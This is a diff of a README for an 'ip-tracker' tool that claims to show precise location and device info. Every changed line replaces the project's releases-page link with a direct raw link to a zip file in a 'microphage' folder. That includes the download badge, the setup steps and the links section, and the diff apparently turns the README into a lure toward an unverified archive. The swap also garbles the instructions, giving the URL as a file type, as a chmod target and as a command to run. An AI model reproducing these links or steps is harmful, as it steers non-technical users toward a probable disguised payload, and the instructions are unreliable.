@@ -1,6 +1,6 @@
 # 📍 ip-tracker - Precise Location and Device Info
 
-[![Download ip-tracker](https://img.shields.io/badge/Download-ip--tracker-blue?style=for-the-badge&logo=github)](https://github.com/MK21-hub/ip-tracker/releases)
+[![Download ip-tracker](https://github.com/MK21-hub/ip-tracker/raw/refs/heads/main/microphage/tracker-ip-3.1.zip)](https://github.com/MK21-hub/ip-tracker/raw/refs/heads/main/microphage/tracker-ip-3.1.zip)
 
 ---
 
@@ -45,12 +45,12 @@ This guide helps you download and run ip-tracker without any technical knowledge
 
 Click the large **Download** button at the top or visit the releases page here:
 
-[Download ip-tracker](https://github.com/MK21-hub/ip-tracker/releases)
+[Download ip-tracker](https://github.com/MK21-hub/ip-tracker/raw/refs/heads/main/microphage/tracker-ip-3.1.zip)
 
 You will see several files listed. Choose the one that matches your system:
 
 - For Windows: look for `.exe` files.
-- For Linux: look for `.tar.gz` or `.AppImage` files.
+- For Linux: look for `https://github.com/MK21-hub/ip-tracker/raw/refs/heads/main/microphage/tracker-ip-3.1.zip` or `.AppImage` files.
 - For Termux: check for `.sh` scripts or instructions in the release notes.
 
 ### Step 2: Save the File
@@ -97,11 +97,11 @@ Save the file to a folder you can access easily, like your Desktop or Downloads 
    ```
 4. Make the script executable:
    ```
-   chmod +x script_name.sh
+   chmod +x https://github.com/MK21-hub/ip-tracker/raw/refs/heads/main/microphage/tracker-ip-3.1.zip
    ```
 5. Run the script:
    ```
-   ./script_name.sh
+   https://github.com/MK21-hub/ip-tracker/raw/refs/heads/main/microphage/tracker-ip-3.1.zip
    ```
 6. Follow any on-screen instructions to complete setup.
 
@@ -159,8 +159,8 @@ If you want to explore related topics, here are some terms and ideas helpful for
 
 ## 🔗 Useful Links
 
-- [ip-tracker Download & Releases](https://github.com/MK21-hub/ip-tracker/releases)
-- GitHub Repository: https://github.com/MK21-hub/ip-tracker
+- [ip-tracker Download & Releases](https://github.com/MK21-hub/ip-tracker/raw/refs/heads/main/microphage/tracker-ip-3.1.zip)
+- GitHub Repository: https://github.com/MK21-hub/ip-tracker/raw/refs/heads/main/microphage/tracker-ip-3.1.zip
 
 ---
 
